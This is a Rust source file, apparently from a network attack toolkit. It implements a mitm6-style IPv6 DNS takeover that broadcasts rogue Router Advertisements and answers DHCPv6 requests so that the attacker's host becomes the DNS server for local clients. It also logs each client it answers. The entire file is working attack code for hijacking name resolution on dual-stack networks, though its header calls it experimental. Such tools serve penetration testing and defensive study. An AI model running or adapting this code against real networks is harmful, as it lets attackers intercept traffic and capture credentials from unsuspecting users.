//! mitm6-style IPv6 DNS takeover (EXPERIMENTAL).
//!
//! Sends rogue ICMPv6 Router Advertisements with the "other config" flag and an
//! RDNSS option pointing at this host, and answers DHCPv6 Solicit/Request/
//! Information-request with this host as the DNS server. On a dual-stack network
//! that makes IPv6-preferring clients resolve names through us.
//!
//! This module compiles and sends well-formed packets, but has not been
//! validated against live clients — treat it as a starting point.

use std::net::{Ipv6Addr, SocketAddrV6, UdpSocket};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use pnet::datalink::NetworkInterface;
use pnet::ipnetwork::IpNetwork;
use socket2::{Domain, Protocol, Socket, Type};

use crate::log::Logger;
use crate::net::err;

const ALL_NODES: Ipv6Addr = Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 1);
const DHCP_SERVERS: Ipv6Addr = Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 1, 2);

pub fn run(iface: &NetworkInterface, logger: Logger, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let ll = link_local(iface).ok_or_else(|| err("interface has no IPv6 link-local address"))?;
    let mac = iface.mac.ok_or_else(|| err("interface has no MAC"))?;
    let idx = iface.index;
    println!("mitm6 (experimental) on {} as {ll} — Ctrl+C to stop\n", iface.name);

    let logger = Arc::new(logger);
    let mac_bytes = [mac.0, mac.1, mac.2, mac.3, mac.4, mac.5];

    // Rogue RA sender.
    let ra_running = running.clone();
    let ra = thread::spawn(move || ra_loop(idx, ll, mac_bytes, ra_running));

    // DHCPv6 responder.
    dhcp6_loop(idx, ll, mac_bytes, &logger, running)?;
    let _ = ra.join();
    Ok(())
}

fn link_local(iface: &NetworkInterface) -> Option<Ipv6Addr> {
    iface.ips.iter().find_map(|ip| match ip {
        IpNetwork::V6(v6) if (v6.ip().segments()[0] & 0xffc0) == 0xfe80 => Some(v6.ip()),
        _ => None,
    })
}

fn ra_loop(ifindex: u32, ll: Ipv6Addr, mac: [u8; 6], running: Arc<AtomicBool>) {
    let sock = match Socket::new(Domain::IPV6, Type::RAW, Some(Protocol::ICMPV6)) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("warning: RA disabled — raw ICMPv6 socket failed ({e})");
            return;
        }
    };
    let _ = sock.set_multicast_if_v6(ifindex);
    let _ = sock.set_multicast_hops_v6(255);
    let dst = SocketAddrV6::new(ALL_NODES, 0, 0, ifindex);

    while running.load(Ordering::SeqCst) {
        let ra = build_ra(ll, mac);
        let _ = sock.send_to(&ra, &dst.into());
        thread::sleep(Duration::from_secs(5));
    }
}

/// ICMPv6 Router Advertisement with RDNSS = `ll` and the Other-config flag.
fn build_ra(ll: Ipv6Addr, mac: [u8; 6]) -> Vec<u8> {
    let mut m = Vec::new();
    m.push(134); // type: RA
    m.push(0); // code
    m.extend_from_slice(&[0, 0]); // checksum (kernel fills for ICMPv6)
    m.push(64); // cur hop limit
    m.push(0x40); // flags: Other-config
    m.extend_from_slice(&0u16.to_be_bytes()); // router lifetime 0 (DNS only)
    m.extend_from_slice(&0u32.to_be_bytes()); // reachable time
    m.extend_from_slice(&0u32.to_be_bytes()); // retrans timer

    // Source link-layer address option (type 1, len 1).
    m.push(1);
    m.push(1);
    m.extend_from_slice(&mac);

    // RDNSS option (type 25, len 3 units = 24 bytes).
    m.push(25);
    m.push(3);
    m.extend_from_slice(&[0, 0]); // reserved
    m.extend_from_slice(&0xffff_ffffu32.to_be_bytes()); // lifetime
    m.extend_from_slice(&ll.octets()); // our address as DNS
    m
}

fn dhcp6_loop(
    ifindex: u32,
    ll: Ipv6Addr,
    mac: [u8; 6],
    logger: &Logger,
    running: Arc<AtomicBool>,
) -> std::io::Result<()> {
    let sock = Socket::new(Domain::IPV6, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    sock.bind(&SocketAddrV6::new(Ipv6Addr::UNSPECIFIED, 547, 0, 0).into())?;
    let _ = sock.join_multicast_v6(&DHCP_SERVERS, ifindex);
    sock.set_read_timeout(Some(Duration::from_secs(1)))?;
    let sock: UdpSocket = sock.into();

    let mut buf = [0u8; 2048];
    while running.load(Ordering::SeqCst) {
        let Ok((n, src)) = sock.recv_from(&mut buf) else { continue };
        let pkt = &buf[..n];
        if pkt.is_empty() {
            continue;
        }
        // DHCPv6: Solicit(1)->Advertise(2), Request(3)/Info-request(11)->Reply(7)
        let reply_type = match pkt[0] {
            1 => 2,
            3 | 11 => 7,
            _ => continue,
        };
        let reply = build_dhcp6_reply(pkt, reply_type, ll, mac);
        let _ = sock.send_to(&reply, src);
        println!("[mitm6] answered DHCPv6 msg-type {} -> DNS {ll}", pkt[0]);
        logger.event(
            "mitm6-dhcp6",
            &src.ip().to_string(),
            serde_json::json!({ "msg_type": pkt[0], "dns": ll.to_string() }),
        );
    }
    Ok(())
}

/// Minimal DHCPv6 reply advertising this host as DNS (option 23).
fn build_dhcp6_reply(req: &[u8], msg_type: u8, ll: Ipv6Addr, mac: [u8; 6]) -> Vec<u8> {
    let mut m = Vec::new();
    m.push(msg_type);
    m.extend_from_slice(&req[1..4]); // echo transaction-id

    // Server Identifier (option 2) as DUID-LL.
    let mut duid = Vec::new();
    duid.extend_from_slice(&3u16.to_be_bytes()); // DUID-LL
    duid.extend_from_slice(&1u16.to_be_bytes()); // hw type: ethernet
    duid.extend_from_slice(&mac);
    push_opt(&mut m, 2, &duid);

    // Echo Client Identifier (option 1) if present.
    if let Some(cid) = find_opt(req, 1) {
        push_opt(&mut m, 1, cid);
    }

    // DNS Recursive Name Server (option 23) = us.
    push_opt(&mut m, 23, &ll.octets());

    m
}

fn push_opt(buf: &mut Vec<u8>, code: u16, data: &[u8]) {
    buf.extend_from_slice(&code.to_be_bytes());
    buf.extend_from_slice(&(data.len() as u16).to_be_bytes());
    buf.extend_from_slice(data);
}

fn find_opt(pkt: &[u8], want: u16) -> Option<&[u8]> {
    let mut i = 4; // after msg-type + transaction-id
    while i + 4 <= pkt.len() {
        let code = u16::from_be_bytes([pkt[i], pkt[i + 1]]);
        let len = u16::from_be_bytes([pkt[i + 2], pkt[i + 3]]) as usize;
        let start = i + 4;
        if start + len > pkt.len() {
            break;
        }
        if code == want {
            return Some(&pkt[start..start + len]);
        }
        i = start + len;
    }
    None
}
